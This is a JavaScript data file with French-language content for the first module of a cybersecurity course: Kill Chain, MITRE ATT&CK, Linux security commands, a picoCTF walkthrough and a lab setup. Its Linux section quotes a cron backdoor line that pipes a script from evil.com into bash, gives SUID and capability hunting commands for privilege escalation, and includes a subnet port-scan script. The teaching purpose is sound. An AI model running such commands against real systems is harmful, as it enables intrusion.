// Rich section data for each module detail page

export const moduleDetails = {
  1: {
    sections: [
      {
        type: 'intro-text',
        title: 'Pourquoi le Mindset est crucial',
        content: `Avant d'écrire une seule ligne de commande, un hacker — offensif ou défensif — doit penser différemment. La cybersécurité n'est pas une suite d'outils à exécuter : c'est une façon de modéliser la réalité, d'identifier les chemins cachés, de penser comme l'adversaire.

Ce module pose les bases cognitives et techniques indispensables : vous apprendrez à cartographier les menaces avec les deux frameworks de référence de l'industrie (MITRE ATT&CK et Cyber Kill Chain), à construire un environnement de lab isolé et reproductible, et à maîtriser Linux comme un outil de sécurité à part entière.`,
        keyPoints: [
          { icon: '🎯', text: 'Penser comme l\'attaquant pour mieux défendre' },
          { icon: '🗺️', text: 'Modéliser chaque attaque avec un framework structuré' },
          { icon: '🔬', text: 'Pratiquer dans des environnements 100% isolés' },
          { icon: '🏁', text: 'Résoudre vos premiers challenges CTF dès la semaine 1' },
        ],
      },

      {
        type: 'kill-chain',
        title: 'Cyber Kill Chain',
        subtitle: 'Modèle Lockheed Martin — Les 7 étapes de toute cyberattaque',
        description: `Développé par Lockheed Martin en 2011, le Cyber Kill Chain modélise la progression d'une attaque en 7 phases séquentielles. Comprendre ce modèle permet aux défenseurs d'identifier à quelle phase une attaque peut être stoppée, et aux offensifs de planifier chaque étape de leur engagement.`,
        steps: [
          {
            num: 1, label: 'Reconnaissance', icon: '🔍',
            color: '#4ade80', bg: 'rgba(74,222,128,0.1)',
            desc: 'Collecte d\'info sur la cible',
            examples: ['OSINT', 'Shodan', 'theHarvester', 'LinkedIn scraping'],
            defender: 'Limiter les infos publiques, surveiller les requêtes DNS',
          },
          {
            num: 2, label: 'Weaponization', icon: '⚗️',
            color: '#a3e635', bg: 'rgba(163,230,53,0.1)',
            desc: 'Création du payload malveillant',
            examples: ['Macro Word', 'PDF piégé', 'CVE exploit', 'Dropper'],
            defender: 'Sandboxing, analyse statique à l\'entrée',
          },
          {
            num: 3, label: 'Delivery', icon: '📨',
            color: '#fbbf24', bg: 'rgba(251,191,36,0.1)',
            desc: 'Envoi du payload à la cible',
            examples: ['Email phishing', 'Watering hole', 'USB drop', 'Supply chain'],
            defender: 'Filtrage email, formation utilisateurs',
          },
          {
            num: 4, label: 'Exploitation', icon: '💥',
            color: '#f97316', bg: 'rgba(249,115,22,0.1)',
            desc: 'Exécution de la vulnérabilité',
            examples: ['RCE', 'Buffer overflow', 'CVE-2021-44228', 'Macro exec'],
            defender: 'Patch management, EDR, application whitelisting',
          },
          {
            num: 5, label: 'Installation', icon: '🪝',
            color: '#ef4444', bg: 'rgba(239,68,68,0.1)',
            desc: 'Persistence sur le système',
            examples: ['Webshell', 'Scheduled task', 'Registry run key', 'Rootkit'],
            defender: 'File integrity monitoring, anomaly detection',
          },
          {
            num: 6, label: 'C2', icon: '📡',
            color: '#dc2626', bg: 'rgba(220,38,38,0.1)',
            desc: 'Canal de commande & contrôle',
            examples: ['HTTPS beacon', 'DNS tunneling', 'Cobalt Strike', 'Sliver'],
            defender: 'Analyse trafic réseau, proxy SSL inspection',
          },
          {
            num: 7, label: 'Actions', icon: '🎯',
            color: '#991b1b', bg: 'rgba(153,27,27,0.1)',
            desc: 'Objectif final atteint',
            examples: ['Exfiltration data', 'Ransomware', 'Sabotage', 'Espionnage'],
            defender: 'DLP, segmentation réseau, zero trust',
          },
        ],
      },

      {
        type: 'mitre-attack',
        title: 'MITRE ATT&CK Framework',
        subtitle: 'La base de données mondiale des techniques d\'attaque',
        description: `MITRE ATT&CK (Adversarial Tactics, Techniques & Common Knowledge) est une knowledge base ouverte recensant les comportements d'adversaires réels observés en conditions réelles. Contrairement au Kill Chain qui donne une vue macro, ATT&CK documente chaque technique précise avec des exemples de groupes APT qui l'ont utilisée.`,
        tactics: [
          { id: 'TA0043', name: 'Reconnaissance', count: 10, color: '#4ade80', icon: '🔭', desc: 'Collecter des informations pour planifier les opérations' },
          { id: 'TA0042', name: 'Resource Development', count: 8, color: '#86efac', icon: '🏗️', desc: 'Établir des ressources pour les opérations' },
          { id: 'TA0001', name: 'Initial Access', count: 9, color: '#fbbf24', icon: '🚪', desc: 'Obtenir un premier accès au réseau' },
          { id: 'TA0002', name: 'Execution', count: 14, color: '#f97316', icon: '⚡', desc: 'Exécuter du code malveillant' },
          { id: 'TA0003', name: 'Persistence', count: 20, color: '#ef4444', icon: '🔒', desc: 'Maintenir un foothold malgré les redémarrages' },
          { id: 'TA0004', name: 'Privilege Escalation', count: 14, color: '#dc2626', icon: '⬆️', desc: 'Obtenir des permissions supérieures' },
          { id: 'TA0005', name: 'Defense Evasion', count: 43, color: '#7c3aed', icon: '🫥', desc: 'Éviter la détection par les défenses' },
          { id: 'TA0006', name: 'Credential Access', count: 17, color: '#a855f7', icon: '🔑', desc: 'Voler des identifiants et secrets' },
          { id: 'TA0007', name: 'Discovery', count: 32, color: '#00b4ff', icon: '🗺️', desc: 'Explorer l\'environnement compromis' },
          { id: 'TA0008', name: 'Lateral Movement', count: 9, color: '#06b6d4', icon: '↔️', desc: 'Se déplacer dans le réseau' },
          { id: 'TA0009', name: 'Collection', count: 17, color: '#10b981', icon: '📦', desc: 'Rassembler des données intéressantes' },
          { id: 'TA0011', name: 'C2', count: 16, color: '#f59e0b', icon: '📡', desc: 'Communiquer avec les systèmes compromis' },
          { id: 'TA0010', name: 'Exfiltration', count: 9, color: '#ff3c5a', icon: '📤', desc: 'Extraire les données de l\'environnement' },
          { id: 'TA0040', name: 'Impact', count: 14, color: '#991b1b', icon: '💣', desc: 'Manipuler, interrompre ou détruire' },
        ],
      },

      {
        type: 'code-multi',
        title: 'Linux avancé pour la sécurité',
        subtitle: 'Commandes essentielles du hacker — à maîtriser avant tout',
        blocks: [
          {
            label: '# 1 — Analyse des permissions & fichiers sensibles',
            lang: 'bash',
            code: `# Trouver les fichiers SUID (exécutables avec droits root)
find / -perm -4000 -type f 2>/dev/null
# Résultat typique :
# /usr/bin/sudo
# /usr/bin/passwd
# /usr/bin/pkexec   ← CVE-2021-4034 (PwnKit!)

# Fichiers world-writable (risque d'écriture non autorisée)
find / -perm -o+w -type f 2>/dev/null | grep -v /proc

# Lister les capabilities (alternative aux SUID)
getcap -r / 2>/dev/null
# python3.10 = cap_setuid+ep  ← privilege escalation!`,
          },
          {
            label: '# 2 — Analyse des logs en temps réel',
            lang: 'bash',
            code: `# Surveiller les connexions SSH en live
tail -f /var/log/auth.log | grep "Failed password"

# Compter les tentatives par IP (brute force detection)
grep "Failed password" /var/log/auth.log \\
  | awk '{print $11}' \\
  | sort | uniq -c | sort -rn | head -20

# Résultat :
#  143 192.168.1.105   ← bot/scanner
#   12 10.0.0.50
#    1 172.16.0.1

# Analyser les connexions réseau actives
ss -tulpn | grep LISTEN
# ou
netstat -antp | grep ESTABLISHED`,
          },
          {
            label: '# 3 — Bash scripting pour la sécurité',
            lang: 'bash',
            code: `#!/bin/bash
# Script : scanner les ports ouverts d'un réseau local

SUBNET="192.168.1"
OPEN_HOSTS=()

echo "[*] Scan du réseau $SUBNET.0/24..."

for i in $(seq 1 254); do
  IP="$SUBNET.$i"
  # Ping rapide avec timeout 0.5s
  if ping -c 1 -W 1 "$IP" &>/dev/null; then
    echo "[+] Host UP: $IP"
    OPEN_HOSTS+=("$IP")
    # Scan des ports communs
    for PORT in 22 80 443 3389 8080; do
      timeout 0.5 bash -c "echo >/dev/tcp/$IP/$PORT" 2>/dev/null \\
        && echo "    [$PORT] OPEN"
    done
  fi
done

echo "[*] Résultat: \${#OPEN_HOSTS[@]} hôtes actifs"`,
          },
          {
            label: '# 4 — Cron jobs suspects (vecteur de persistence)',
            lang: 'bash',
            code: `# Lister TOUS les cron jobs du système
for user in $(cut -f1 -d: /etc/passwd); do
  crontab -u $user -l 2>/dev/null | grep -v "^#" | grep -v "^$" \\
    && echo "  ^-- User: $user"
done

# Crons système
cat /etc/crontab
ls -la /etc/cron.*

# Résultat suspect :
# */5 * * * * root curl http://evil.com/payload.sh | bash
#             ↑ Backdoor classique — alerter immédiatement!

# Détecter les modifications récentes de cron
find /var/spool/cron /etc/cron* -newer /etc/passwd 2>/dev/null`,
          },
        ],
      },

      {
        type: 'ctf-challenge',
        title: 'Exemple CTF — Votre premier challenge',
        subtitle: 'Mise en pratique immédiate sur un challenge réel de niveau easy',
        challenge: {
          name: 'Hidden in Plain Sight',
          platform: 'PicoCTF',
          category: 'General Skills',
          difficulty: 'Easy',
          points: 100,
          description: `Un fichier mystérieux vous a été envoyé. Le flag est caché quelque part dans ce binaire. Trouvez-le.

Fichier fourni : \`mystery_binary\``,
          steps: [
            {
              step: 1, title: 'Identification du fichier',
              code: `file mystery_binary
# mystery_binary: ELF 64-bit LSB executable, x86-64

# Vérifier les métadonnées
exiftool mystery_binary 2>/dev/null`,
              explain: 'Toujours commencer par identifier le type de fichier avant d\'aller plus loin.',
            },
            {
              step: 2, title: 'Extraction des chaînes de caractères',
              code: `# Extraire toutes les strings lisibles
strings mystery_binary

# Filtrer directement le format de flag picoCTF
strings mystery_binary | grep -i "picoCTF{"

# Résultat :
# picoCTF{str1ngs_1s_y0ur_fr13nd_7f23a1}`,
              explain: 'La commande `strings` extrait toutes les séquences de caractères ASCII/UTF-8 d\'un binaire. C\'est souvent la première chose à faire en CTF.',
            },
            {
              step: 3, title: 'Soumettre le flag',
              code: `# Flag trouvé :
picoCTF{str1ngs_1s_y0ur_fr13nd_7f23a1}

# Outils alternatifs pour aller plus loin :
xxd mystery_binary | head -20    # hexdump
binwalk mystery_binary            # fichiers cachés
objdump -d mystery_binary         # disassembly`,
              explain: 'Félicitations ! Ce challenge illustre l\'importance de `strings`, outil que vous utiliserez dans le Module 6 (Reverse Engineering).',
            },
          ],
          flag: 'picoCTF{str1ngs_1s_y0ur_fr13nd_7f23a1}',
          lesson: 'La commande strings est l\'un des premiers réflexes en analyse de binaires — simple mais incroyablement efficace.',
        },
      },

      {
        type: 'lab-setup',
        title: 'Mise en place du Lab',
        subtitle: 'Environnement isolé et reproductible pour toute la formation',
        description: 'Un bon lab est la base de tout apprentissage en cybersécurité. Voici l\'architecture que nous utiliserons tout au long de la formation.',
        diagram: `
┌─────────────────────────────────────────────────────────────┐
│                    MACHINE HÔTE (Windows/Mac/Linux)          │
│                                                             │
│  ┌──────────────────┐    ┌──────────────────────────────┐  │
│  │  Kali Linux VM   │    │     Réseau Isolé (NAT)       │  │
│  │                  │◄──►│                              │  │
│  │  ┌────────────┐  │    │  ┌──────────┐ ┌──────────┐  │  │
│  │  │  Outils    │  │    │  │ Target 1 │ │ Target 2 │  │  │
│  │  │  Pentest   │  │    │  │ Metasp-  │ │ DVWA     │  │  │
│  │  │  Forensics │  │    │  │ loitable │ │ (Web)    │  │  │
│  │  └────────────┘  │    │  └──────────┘ └──────────┘  │  │
│  └──────────────────┘    └──────────────────────────────┘  │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │           Docker Desktop (Labs additionnels)          │  │
│  │  [DVWA] [VulnHub] [HackTheBox] [TryHackMe VPN]       │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘`,
        commands: [
          {
            label: 'Installation Kali Linux (Docker — version rapide)',
            code: `# Lancer Kali Linux en Docker
docker run -it --name kali-lab \\
  -v $(pwd)/shared:/shared \\
  --network isolated-net \\
  kalilinux/kali-rolling /bin/bash

# Installer les outils essentiels (module 1)
apt update && apt install -y \\
  nmap wireshark netcat-traditional \\
  python3 python3-pip git curl wget \\
  binutils file strings xxd`,
          },
          {
            label: 'Créer le réseau isolé Docker',
            code: `# Réseau isolé pour les labs (pas d'accès Internet aux cibles)
docker network create \\
  --driver bridge \\
  --subnet 172.20.0.0/16 \\
  --opt com.docker.network.bridge.enable_ip_masquerade=false \\
  isolated-net

# Vérifier l'isolation
docker network inspect isolated-net`,
          },
          {
            label: 'Lancer une cible vulnérable (DVWA)',
            code: `# Damn Vulnerable Web App — pour le module Pentest Web
docker run -d --name dvwa \\
  --network isolated-net \\
  --ip 172.20.0.10 \\
  vulnerables/web-dvwa

# Lancer Metasploitable 2 — pour le module Pentest Infra
docker run -d --name metasploitable \\
  --network isolated-net \\
  --ip 172.20.0.20 \\
  tleemcjr/metasploitable2

echo "[+] Lab prêt ! Kali → 172.20.0.0/16"`,
          },
        ],
      },
    ],
  },
}
